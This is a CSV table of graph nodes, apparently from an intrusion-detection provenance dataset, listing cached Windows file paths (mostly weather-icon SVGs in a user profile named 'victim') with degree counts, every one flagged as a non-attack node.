uuid,annotation,node_order,is_attack_node,in_degree_subgraph,out_degree_subgraph,total_degree_subgraph,in_degree_full,out_degree_full,total_degree_full
557d6b71-ab19-4427-9345-a5793758602c,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\6DNTYFPY\\TB_W06_Cloudy_15[1].svg'},1853,False,1,0,1,1,0,1
9365de32-f94f-49a1-9b09-8afa4ed0a76c,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\CY46PLUZ\\TB_W06_Cloudy_17[1].svg'},1854,False,1,0,1,1,0,1
c36013b9-7cfd-4bc4-9b70-68a999d155c7,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\DLVWNFMQ\\TB_W06_Cloudy_16[1].svg'},1855,False,1,0,1,1,0,1
272c6937-d6aa-4d79-be92-c1e29284abcd,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\69CDNZW2\\TB_W06_Cloudy_19[1].svg'},1856,False,1,0,1,1,0,1
e12eaac8-c76a-49a8-a30d-adc2d23aa4dd,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\6DNTYFPY\\TB_W06_Cloudy_20[1].svg'},1857,False,1,0,1,1,0,1
242a926f-653a-4e0b-ad4f-c67df5e4cf45,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\69CDNZW2\\TB_W06_Cloudy_21[1].svg'},1858,False,1,0,1,1,0,1
246cd250-8292-4e7e-9a98-a5ff5c638779,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\6DNTYFPY\\TB_W06_Cloudy_22[1].svg'},1859,False,1,0,1,1,0,1
141bdfe3-148d-4f6d-8f6e-a7062dfdb6da,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\6DNTYFPY\\TB_W06_Cloudy_06[1].svg'},1860,False,1,0,1,1,0,1
76d18c2e-4788-45df-80b2-0cda1f19dc35,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\69CDNZW2\\TB_W06_Cloudy_24[1].svg'},1861,False,1,0,1,1,0,1
404f0149-135b-40a6-b53d-fcb7f61cb6e4,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\DLVWNFMQ\\TB_W06_Cloudy_28[1].svg'},1862,False,1,0,1,1,0,1
d98c23c8-2424-4d4f-993b-5ba868b8f4af,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\6DNTYFPY\\TB_W06_Cloudy_25[1].svg'},1863,False,1,0,1,1,0,1
5b2307ab-eb32-4e2c-83fe-488bca8a0d1d,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\69CDNZW2\\TB_W06_Cloudy_26[1].svg'},1864,False,1,0,1,1,0,1
aed1b6af-8ddb-4b7f-87df-ee77ba316aa3,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\CY46PLUZ\\TB_W06_Cloudy_27[1].svg'},1865,False,1,0,1,1,0,1
0e78f950-2280-46c1-a5e2-f1952bac4c43,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\CY46PLUZ\\TB_W06_Cloudy_29[1].svg'},1866,False,1,0,1,1,0,1
941fbd6a-7915-455d-b82f-348259d1bd0f,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\6DNTYFPY\\TB_W06_Cloudy_30[1].svg'},1867,False,1,0,1,1,0,1
528c8e1f-4fb1-4b15-b959-8c9097453d99,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\6DNTYFPY\\WI10_TempsBreakRecordHigh_08[1].svg'},1868,False,1,0,1,1,0,1
a33add7c-aa9b-4d33-9b93-49a9083f5a61,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\69CDNZW2\\TB_W06_Cloudy_31[1].svg'},1869,False,1,0,1,1,0,1
27317e18-eaf9-4e7d-a94b-359faf34dc02,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\DLVWNFMQ\\TB_W06_Cloudy_32[1].svg'},1870,False,1,0,1,1,0,1
08878afe-3ccd-4ecd-8cf8-aef49227da46,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\6DNTYFPY\\TB_W06_Cloudy_33[1].svg'},1871,False,1,0,1,1,0,1
8bcb8ead-a947-4a6b-ab83-8c0025ac5920,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\69CDNZW2\\TB_W06_Cloudy_34[1].svg'},1872,False,1,0,1,1,0,1
83cebf40-e70f-47d9-a4b2-3022ca6203f5,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\CY46PLUZ\\TB_W06_Cloudy_35[1].svg'},1873,False,1,0,1,1,0,1
ef47ec46-0f8a-4bd5-8c31-fd23273308cc,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\69CDNZW2\\WI10_TempsBreakRecordHigh_15[1].svg'},1874,False,1,0,1,1,0,1
6d02d0c3-36e1-4bcd-8f9d-ab48c2d60c33,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\6DNTYFPY\\TB_W06_Cloudy_37[1].svg'},1875,False,1,0,1,1,0,1
f13e4f5b-cdd3-4fdb-9a39-2056b10d894e,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\69CDNZW2\\TB_W06_Cloudy_38[1].svg'},1876,False,1,0,1,1,0,1
d5a0675d-767d-4f2a-a4e3-0080ae5fd8e9,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\CY46PLUZ\\TB_W06_Cloudy_39[1].svg'},1877,False,1,0,1,1,0,1
2744a59d-4e8f-4286-9724-8f03e69ad4a0,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\CY46PLUZ\\TB_W06_Cloudy_40[1].svg'},1878,False,1,0,1,1,0,1
3a26035e-a6e1-4e90-8695-95985afe2607,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\DLVWNFMQ\\WI10_TempsBreakRecordHigh_01[1].svg'},1879,False,1,0,1,1,0,1
96ad11c2-e035-4121-b0dd-13ddc8f8151f,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\6DNTYFPY\\WI10_TempsBreakRecordHigh_02[1].svg'},1880,False,1,0,1,1,0,1
73e7b268-a8b9-45c2-b19d-3de5ea2307bf,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\CY46PLUZ\\WI10_TempsBreakRecordHigh_03[1].svg'},1881,False,1,0,1,1,0,1
bd411668-0d65-4781-9af4-dc11961b1d2e,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\69CDNZW2\\WI10_TempsBreakRecordHigh_04[1].svg'},1882,False,1,0,1,1,0,1
5ea78368-1e7f-4d51-9712-6936fe637a71,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\6DNTYFPY\\WI10_TempsBreakRecordHigh_05[1].svg'},1883,False,1,0,1,1,0,1
e31f39ad-72a7-462a-9100-cc49c720b919,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\69CDNZW2\\WI10_TempsBreakRecordHigh_06[1].svg'},1884,False,1,0,1,1,0,1
5e3dc649-f125-4f32-a943-a89ec17170a4,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\CY46PLUZ\\WI10_TempsBreakRecordHigh_07[1].svg'},1885,False,1,0,1,1,0,1
68c726e2-a703-4837-948b-19fc54dcff7b,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\6DNTYFPY\\WI10_TempsBreakRecordHigh_09[1].svg'},1886,False,1,0,1,1,0,1
7048315f-952e-4eb0-8f81-b5fb070a282c,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\CY46PLUZ\\WI10_TempsBreakRecordHigh_10[1].svg'},1887,False,1,0,1,1,0,1
6f1e2e17-e1d9-45b7-902c-8395099ec7fb,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\69CDNZW2\\WI10_TempsBreakRecordHigh_19[1].svg'},1888,False,1,0,1,1,0,1
26701570-46a4-472d-917d-b3df56be6f8e,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\DLVWNFMQ\\WI10_TempsBreakRecordHigh_12[1].svg'},1889,False,1,0,1,1,0,1
b193cf69-4446-46ee-8b86-c20e176fae71,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\DLVWNFMQ\\WI10_TempsBreakRecordHigh_13[1].svg'},1890,False,1,0,1,1,0,1
5f56c6eb-f028-4f61-8e58-66306059a494,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\CY46PLUZ\\WI10_TempsBreakRecordHigh_14[1].svg'},1891,False,1,0,1,1,0,1
7c518889-b746-49b1-8322-9147c953f284,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\DLVWNFMQ\\TB_W06_Cloudy_36[1].svg'},1892,False,1,0,1,1,0,1
e75ea149-101e-4dfe-9383-6bf1fc81be3f,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\CY46PLUZ\\WI10_TempsBreakRecordHigh_21[1].svg'},1893,False,1,0,1,1,0,1
42230fd1-55c4-40ad-b269-10ee8fb74c3d,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\CY46PLUZ\\WI10_TempsBreakRecordHigh_16[1].svg'},1894,False,1,0,1,1,0,1
afa7916d-a5f5-4c82-8f79-a8c41aeb0010,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\DLVWNFMQ\\WI10_TempsBreakRecordHigh_17[1].svg'},1895,False,1,0,1,1,0,1
06ffb506-37ed-449d-9d7e-cc25f6d5e5ae,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\6DNTYFPY\\WI10_TempsBreakRecordHigh_18[1].svg'},1896,False,1,0,1,1,0,1
56d77182-d80a-4a15-b10d-737d71ce86b6,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\69CDNZW2\\WI10_TempsBreakRecordHigh_11[1].svg'},1899,False,1,0,1,1,0,1
241f3aef-5329-4d69-8eb6-5acb028dc5ce,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\6DNTYFPY\\WI10_TempsBreakRecordHigh_20[1].svg'},1900,False,1,0,1,1,0,1
58aefae2-32a7-4efc-bebd-09c36e9136f3,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\69CDNZW2\\WI10_TempsBreakRecordHigh_36[1].svg'},1901,False,1,0,1,1,0,1
ea42fc6a-146e-4cea-8a25-177e5d6de8a4,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\69CDNZW2\\WI10_TempsBreakRecordHigh_22[1].svg'},1902,False,1,0,1,1,0,1
f651bc2e-b594-4db7-974e-703fb2db2687,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\6DNTYFPY\\WI10_TempsBreakRecordHigh_24[1].svg'},1903,False,1,0,1,1,0,1
b447f311-778a-4a91-b656-fdb48b3bc051,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\DLVWNFMQ\\WI10_TempsBreakRecordHigh_23[1].svg'},1904,False,1,0,1,1,0,1
bb48b2b2-ccd3-4173-92bd-9e141bef33a1,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\6DNTYFPY\\WI10_TempsBreakRecordHigh_25[1].svg'},1905,False,1,0,1,1,0,1
2becac87-e4c4-4828-95ad-53fcb74c6e92,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\CY46PLUZ\\WI10_TempsBreakRecordHigh_27[1].svg'},1906,False,1,0,1,1,0,1
ca4b562a-0c04-4cd4-8a06-ccaddc5278d9,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\69CDNZW2\\WI10_TempsBreakRecordHigh_26[1].svg'},1907,False,1,0,1,1,0,1
bde11958-4c39-45cf-999f-ab6fa9c55623,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\DLVWNFMQ\\WI10_TempsBreakRecordHigh_28[1].svg'},1908,False,1,0,1,1,0,1
2d9b779a-f8e7-4ea4-b45e-be0bd67e5d80,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\69CDNZW2\\WI10_TempsBreakRecordHigh_29[1].svg'},1909,False,1,0,1,1,0,1
516b1858-af15-411f-aa7b-cc8ef544cd56,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\CY46PLUZ\\WI10_TempsBreakRecordHigh_30[1].svg'},1910,False,1,0,1,1,0,1
f5c89cc3-c7bb-4e57-a058-f37ceb2e461d,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\DLVWNFMQ\\WI10_TempsBreakRecordHigh_31[1].svg'},1911,False,1,0,1,1,0,1
37d252a4-6c09-4b86-8940-89265e4bfd51,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\DLVWNFMQ\\WI10_TempsBreakRecordHigh_32[1].svg'},1912,False,1,0,1,1,0,1
94ce5ed8-1385-432d-b5ce-fa98936e91b8,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\6DNTYFPY\\WI10_TempsBreakRecordHigh_33[1].svg'},1913,False,1,0,1,1,0,1
02cf13d3-5992-4492-8931-9e10cbf14775,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\6DNTYFPY\\WI20_TempsaDropTomorrow_05[1].svg'},1914,False,1,0,1,1,0,1
b3348a19-81fc-4c30-bef7-121837ceb34e,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\CY46PLUZ\\WI10_TempsBreakRecordHigh_35[1].svg'},1915,False,1,0,1,1,0,1
66f21a92-6e98-4bf6-89e0-fd0155b63abd,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\69CDNZW2\\WI10_TempsBreakRecordHigh_37[1].svg'},1916,False,1,0,1,1,0,1
aeaa1381-663b-4832-a8fd-7feef0f101c7,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\CY46PLUZ\\WI10_TempsBreakRecordHigh_38[1].svg'},1917,False,1,0,1,1,0,1
6c9abc34-9089-4a41-95e3-bbd1e94c38ce,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\CY46PLUZ\\WI10_TempsBreakRecordHigh_39[1].svg'},1918,False,1,0,1,1,0,1
67bd3fef-4bcf-4525-badf-e5a95adf9921,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\DLVWNFMQ\\WI10_TempsBreakRecordHigh_40[1].svg'},1919,False,1,0,1,1,0,1
020f6626-717f-4230-81c4-496b947d08b2,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\CY46PLUZ\\WI20_TempsaDropTomorrow_01[1].svg'},1920,False,1,0,1,1,0,1
191eb1a4-400a-414a-8abd-1b9b18044aaf,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\69CDNZW2\\WI20_TempsaDropTomorrow_02[1].svg'},1921,False,1,0,1,1,0,1
6f1b39f7-563b-4d2c-a55f-ff0ad1864a8a,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\CY46PLUZ\\WI20_TempsaDropTomorrow_03[1].svg'},1922,False,1,0,1,1,0,1
bfd63374-2e34-4bbe-923f-f1bf5a1450b8,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\CY46PLUZ\\WI20_TempsaDropTomorrow_04[1].svg'},1923,False,1,0,1,1,0,1
59d98247-9bd1-4698-bc92-8bdbb65c68ba,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\6DNTYFPY\\WI10_TempsBreakRecordHigh_34[1].svg'},1924,False,1,0,1,1,0,1
cdb49b39-f500-4b41-a86a-551a74c88a1a,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\DLVWNFMQ\\WI20_TempsaDropTomorrow_06[1].svg'},1925,False,1,0,1,1,0,1
b91347bd-21ec-45c0-859a-17189668c0d7,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\69CDNZW2\\WI20_TempsaDropTomorrow_07[1].svg'},1926,False,1,0,1,1,0,1
4f885939-560d-45b5-ae2a-552e0ce4218b,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\6DNTYFPY\\WI20_TempsaDropTomorrow_08[1].svg'},1927,False,1,0,1,1,0,1
a6c56957-3001-401c-ac29-5071f00eb756,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\DLVWNFMQ\\WI20_TempsaDropTomorrow_09[1].svg'},1928,False,1,0,1,1,0,1
b65574e3-4dd5-44eb-9e6d-241c01601ca9,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\69CDNZW2\\WI20_TempsaDropTomorrow_10[1].svg'},1929,False,1,0,1,1,0,1
210905d0-638d-4526-8cce-a32bd6208a73,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\CY46PLUZ\\WI20_TempsaDropTomorrow_11[1].svg'},1930,False,1,0,1,1,0,1
88af04ca-9467-4e2c-99b9-f9f264ff6f5b,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\DLVWNFMQ\\WI20_TempsaDropTomorrow_12[1].svg'},1931,False,1,0,1,1,0,1
39cb62b3-91c1-4f1b-926e-4455018829d2,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\6DNTYFPY\\WI20_TempsaDropTomorrow_13[1].svg'},1932,False,1,0,1,1,0,1
79c3ed68-979c-4140-ad3f-97a40138a247,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\69CDNZW2\\WI20_TempsaDropTomorrow_14[1].svg'},1933,False,1,0,1,1,0,1
a7d88ca8-2516-48d3-aacc-eb48241d0475,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\DLVWNFMQ\\WI20_TempsaDropTomorrow_15[1].svg'},1934,False,1,0,1,1,0,1
0d81daf7-b0e3-43a3-bd27-3541068dd01b,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\69CDNZW2\\WI20_TempsaDropTomorrow_16[1].svg'},1935,False,1,0,1,1,0,1
e89880eb-cc17-42a3-b763-d524c66df749,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\CY46PLUZ\\WI20_TempsaDropTomorrow_17[1].svg'},1936,False,1,0,1,1,0,1
74f56135-252d-4ea4-a3e0-98d99183a156,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\6DNTYFPY\\WI20_TempsaDropTomorrow_18[1].svg'},1937,False,1,0,1,1,0,1
c9058acc-7081-45c9-9bb4-e6e0fb8c9bdd,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\CY46PLUZ\\WI20_TempsaDropTomorrow_19[1].svg'},1938,False,1,0,1,1,0,1
ba646270-7ca0-4b89-bc13-c4bd543c8499,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\CY46PLUZ\\WI20_TempsaDropTomorrow_20[1].svg'},1939,False,1,0,1,1,0,1
c533e2c0-f547-4a84-8b3c-468c484f540b,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\DLVWNFMQ\\WI20_TempsaDropTomorrow_21[1].svg'},1940,False,1,0,1,1,0,1
0c2371ea-e82e-405e-9438-8b45cea8a6fb,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\69CDNZW2\\WI20_TempsaDropTomorrow_33[2].svg'},1941,False,1,0,1,1,0,1
8468c221-d194-4ee9-a67e-2603560fecd1,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\DLVWNFMQ\\WI20_TempsaDropTomorrow_23[2].svg'},1942,False,1,0,1,1,0,1
125d9ed1-4666-478a-87c6-0a5ca45395ca,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\6DNTYFPY\\WI20_TempsaDropTomorrow_24[1].svg'},1943,False,1,0,1,1,0,1
bdd14801-ca3f-4955-82eb-74a301c4cde3,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\69CDNZW2\\WI20_TempsaDropTomorrow_25[1].svg'},1944,False,1,0,1,1,0,1
79cacd97-a5d3-4a49-882c-a5dead860d5c,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\6DNTYFPY\\WI20_TempsaDropTomorrow_26[1].svg'},1945,False,1,0,1,1,0,1
949d0641-429c-4b53-95fb-5afb084aecd8,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\DLVWNFMQ\\WI20_TempsaDropTomorrow_27[1].svg'},1946,False,1,0,1,1,0,1
b9c7300a-2476-42d7-a0c1-e2146408b2ca,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\6DNTYFPY\\WI20_TempsaDropTomorrow_28[1].svg'},1947,False,1,0,1,1,0,1
2d056c7f-ba39-47f2-9786-24d463e2b551,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\DLVWNFMQ\\WI20_TempsaDropTomorrow_36[1].svg'},1948,False,1,0,1,1,0,1
4c98d854-615b-4022-a9c4-dbd0a9f56fac,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\69CDNZW2\\WI20_TempsaDropTomorrow_30[1].svg'},1949,False,1,0,1,1,0,1
9239b035-5e4d-423a-acca-928c6a8d03db,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\DLVWNFMQ\\WI20_TempsaDropTomorrow_31[1].svg'},1950,False,1,0,1,1,0,1
88769181-612e-41e1-ac9a-386f62857d61,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\CY46PLUZ\\WI20_TempsaDropTomorrow_32[1].svg'},1951,False,1,0,1,1,0,1
8114043b-101b-4cda-88f5-c73a5f8b8b13,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\6DNTYFPY\\WI20_TempsaDropTomorrow_22[1].svg'},1952,False,1,0,1,1,0,1
4e3de8c6-2ef3-49f2-9297-e210c9eb857d,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\69CDNZW2\\WI20_TempsaDropTomorrow_34[1].svg'},1953,False,1,0,1,1,0,1
347922d5-327f-4014-8b35-2c380e81f82f,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\CY46PLUZ\\WI20_TempsaDropTomorrow_35[1].svg'},1954,False,1,0,1,1,0,1
24fc40d2-1d5e-4b6c-a43c-3bbe14cf9c05,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\69CDNZW2\\WI20_TempsaDropTomorrow_29[1].svg'},1955,False,1,0,1,1,0,1
666d435c-7152-4eb6-92e6-299baf13a221,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\6DNTYFPY\\WI20_TempsaDropTomorrow_37[1].svg'},1956,False,1,0,1,1,0,1
3961143e-2f72-481c-87c2-b659adca780d,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\CY46PLUZ\\WI20_TempsaDropTomorrow_38[1].svg'},1957,False,1,0,1,1,0,1
b854ce14-09b5-421a-80b4-cc8e889558bf,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\DLVWNFMQ\\WI20_TempsaDropTomorrow_39[1].svg'},1958,False,1,0,1,1,0,1
39b0baac-5fb7-44c2-a8d0-e87219c7955a,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\6DNTYFPY\\WI20_TempsaDropTomorrow_40[1].svg'},1959,False,1,0,1,1,0,1
8a706f64-e289-407d-98af-8401796f3c27,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\DLVWNFMQ\\AAehyQC[1].svg'},2147,False,1,0,1,1,0,1
d0d8ccff-b6a5-41e0-b545-124ef179b979,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cache\\Cache_Data\\f_0000be'},2348,False,1,0,1,1,0,1
ab64ebcd-9980-4a42-8ac2-dfb12c309367,{'file': 'C:\\Windows\\system32\\Fluency\\en-US\\.config'},2697,False,1,0,1,1,0,1
d1b63674-15c7-4d6a-a63e-d4d0ef3bb163,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\DashTrackerDatabase'},4538,False,1,0,1,1,0,1
c0755063-be97-4d45-917e-0afd02a4264e,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\DashTrackerDatabase-journal'},4539,False,1,0,1,1,0,1
a003160c-e68c-4323-bf99-d0be7b73fe51,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\CY46PLUZ\\th[1].png'},4706,False,1,0,1,1,0,1
